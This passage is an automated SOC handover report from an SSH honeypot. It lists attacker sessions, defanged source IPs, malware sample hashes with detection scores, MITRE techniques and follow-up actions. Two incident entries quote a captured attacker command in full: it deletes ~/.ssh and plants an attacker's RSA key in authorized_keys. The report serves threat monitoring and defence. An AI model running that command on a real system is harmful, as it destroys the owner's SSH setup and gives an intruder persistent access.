| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:47:30` | `cowrie.session.connect` |
| `2026-06-12 21:47:30` | `cowrie.client.version` |
| `2026-06-12 21:47:31` | `cowrie.client.kex` |
| `2026-06-12 21:47:32` | `cowrie.login.success` |
| `2026-06-12 21:47:33` | `cowrie.session.params` |
| `2026-06-12 21:47:33` | `cowrie.command.input` |
| `2026-06-12 21:47:33` | `cowrie.command.failed` |
| `2026-06-12 21:47:33` | `cowrie.log.closed` |
| `2026-06-12 21:47:34` | `cowrie.session.params` |
| `2026-06-12 21:47:34` | `cowrie.command.input` |
| `2026-06-12 21:47:34` | `cowrie.session.file_download` |
| `2026-06-12 21:47:34` | `cowrie.log.closed` |
| `2026-06-12 21:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ea545dba3e2

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 21:47 |
| **Last Seen** | 2026-06-12 21:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:47:37` | `cowrie.session.connect` |
| `2026-06-12 21:47:37` | `cowrie.client.version` |
| `2026-06-12 21:47:37` | `cowrie.client.kex` |
| `2026-06-12 21:47:38` | `cowrie.login.success` |
| `2026-06-12 21:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9318a0d324f5

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:49 |
| **Last Seen** | 2026-06-12 21:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:49:19` | `cowrie.session.connect` |
| `2026-06-12 21:49:19` | `cowrie.client.version` |
| `2026-06-12 21:49:19` | `cowrie.client.kex` |
| `2026-06-12 21:49:20` | `cowrie.login.success` |
| `2026-06-12 21:49:20` | `cowrie.session.params` |
| `2026-06-12 21:49:20` | `cowrie.command.input` |
| `2026-06-12 21:49:20` | `cowrie.command.failed` |
| `2026-06-12 21:49:20` | `cowrie.log.closed` |
| `2026-06-12 21:49:20` | `cowrie.session.params` |
| `2026-06-12 21:49:20` | `cowrie.command.input` |
| `2026-06-12 21:49:21` | `cowrie.session.file_download` |
| `2026-06-12 21:49:21` | `cowrie.log.closed` |
| `2026-06-12 21:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d80e8e36ed1

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:49 |
| **Last Seen** | 2026-06-12 21:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:49:23` | `cowrie.session.connect` |
| `2026-06-12 21:49:23` | `cowrie.client.version` |
| `2026-06-12 21:49:23` | `cowrie.client.kex` |
| `2026-06-12 21:49:23` | `cowrie.login.success` |
| `2026-06-12 21:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `114.219.157[.]97` | **34** | 2026-06-12 18:33 | 2026-06-12 19:01 | 52m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.60.242[.]169` | **30** | 2026-06-12 18:47 | 2026-06-12 19:50 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.74.5[.]44` | **30** | 2026-06-12 18:39 | 2026-06-12 19:52 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `196.196.253[.]20` | **30** | 2026-06-12 18:36 | 2026-06-12 19:45 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `209.99.190[.]200` | **30** | 2026-06-12 18:38 | 2026-06-12 19:39 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.248.83[.]33` | **26** | 2026-06-12 20:48 | 2026-06-12 21:49 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `190.167.237[.]191` | **20** | 2026-06-12 19:47 | 2026-06-12 20:31 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `192.3.196[.]157` | **20** | 2026-06-12 18:16 | 2026-06-12 18:55 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `104.244.74[.]84` | **9** | 2026-06-12 21:27 | 2026-06-12 21:49 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.182[.]41` | **4** | 2026-06-12 19:30 | 2026-06-12 19:42 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `43.163.107[.]154` | **3** | 2026-06-12 18:28 | 2026-06-12 19:37 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `103.100.84[.]116` | **2** | 2026-06-12 20:52 | 2026-06-12 20:59 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `117.33.242[.]180` | **2** | 2026-06-12 18:25 | 2026-06-12 18:28 | 4m | 0 | `T1592` | 🟢 LOW |
| `128.199.25[.]179` | **2** | 2026-06-12 19:23 | 2026-06-12 19:30 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.84.243[.]79` | **2** | 2026-06-12 20:51 | 2026-06-12 20:59 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `172.202.113[.]141` | **2** | 2026-06-12 19:19 | 2026-06-12 19:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `27.155.77[.]43` | **2** | 2026-06-12 18:11 | 2026-06-12 18:15 | 4m | 0 | `T1592` | 🟢 LOW |
| `42.180.132[.]32` | **2** | 2026-06-12 18:57 | 2026-06-12 18:59 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.82[.]218` | 1 | 2026-06-12 18:29 | 2026-06-12 18:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.91[.]58` | 1 | 2026-06-12 20:49 | 2026-06-12 20:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.220.87[.]78` | 1 | 2026-06-12 19:34 | 2026-06-12 19:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.174.80[.]40` | 1 | 2026-06-12 19:36 | 2026-06-12 19:36 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.186.31[.]66` | 1 | 2026-06-12 18:26 | 2026-06-12 18:26 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.35.0[.]177` | 1 | 2026-06-12 20:41 | 2026-06-12 20:42 | 31s | 0 | `T1592` | 🟢 LOW |
| `116.111.39[.]160` | 1 | 2026-06-12 18:50 | 2026-06-12 18:51 | 12s | 0 | `T1592` | 🟢 LOW |
| `118.145.111[.]55` | 1 | 2026-06-12 18:43 | 2026-06-12 18:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.28.196[.]250` | 1 | 2026-06-12 19:49 | 2026-06-12 19:49 | 12s | 0 | `T1592` | 🟢 LOW |
| `120.48.130[.]213` | 1 | 2026-06-12 18:25 | 2026-06-12 18:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.98[.]75` | 1 | 2026-06-12 18:21 | 2026-06-12 18:21 | 2s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]85` | 1 | 2026-06-12 19:29 | 2026-06-12 19:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]138` | 1 | 2026-06-12 19:27 | 2026-06-12 19:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-06-12 18:41 | 2026-06-12 18:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.135.63[.]175` | 1 | 2026-06-12 18:19 | 2026-06-12 18:19 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.253.79[.]195` | 1 | 2026-06-12 21:29 | 2026-06-12 21:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `202.85.222[.]190` | 1 | 2026-06-12 21:27 | 2026-06-12 21:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.92.36[.]109` | 1 | 2026-06-12 21:38 | 2026-06-12 21:38 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.253.40[.]231` | 1 | 2026-06-12 21:29 | 2026-06-12 21:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `42.51.40[.]180` | 1 | 2026-06-12 20:55 | 2026-06-12 20:55 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.254.16[.]239` | 1 | 2026-06-12 18:37 | 2026-06-12 18:38 | 30s | 0 | `T1592` | 🟢 LOW |
| `61.52.137[.]128` | 1 | 2026-06-12 21:28 | 2026-06-12 21:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `98.117.51[.]83` | 1 | 2026-06-12 19:04 | 2026-06-12 19:04 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `128.199.25[.]179` | IN | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `116.111.39[.]160` | VN | Viettel Group | **100** ⚠️ | 1 |
| `42.180.132[.]32` | CN | UNICOM Liaoning Province Network | **100** ⚠️ | 9 |
| `152.32.182[.]41` | US | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 11 |
| `103.100.84[.]116` | ID | POLITANI Pangkep | **100** ⚠️ | 28 |
| `172.202.113[.]141` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `114.35.0[.]177` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 2 |
| `102.220.87[.]78` | ZA | CloudAfrica Hosting (PTY) LTD | **100** ⚠️ | 5 |
| `104.244.74[.]84` | CH | BuyVM | **100** ⚠️ | 50 |
| `196.196.253[.]20` | EE | SA | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 406 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 223 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 129 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 68 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 68 |

---

## 🔕 False Positive Summary (72 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 25 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 43 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 474 cases |
| Tool 34  | Credential Extractor        | ✅ 352 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 54 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 72 filtered (15.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 41 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 129 priority case(s) shown individually · 41 recon entry/entries in table (18 group(s) consolidating 250 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-12T21:51:19Z_
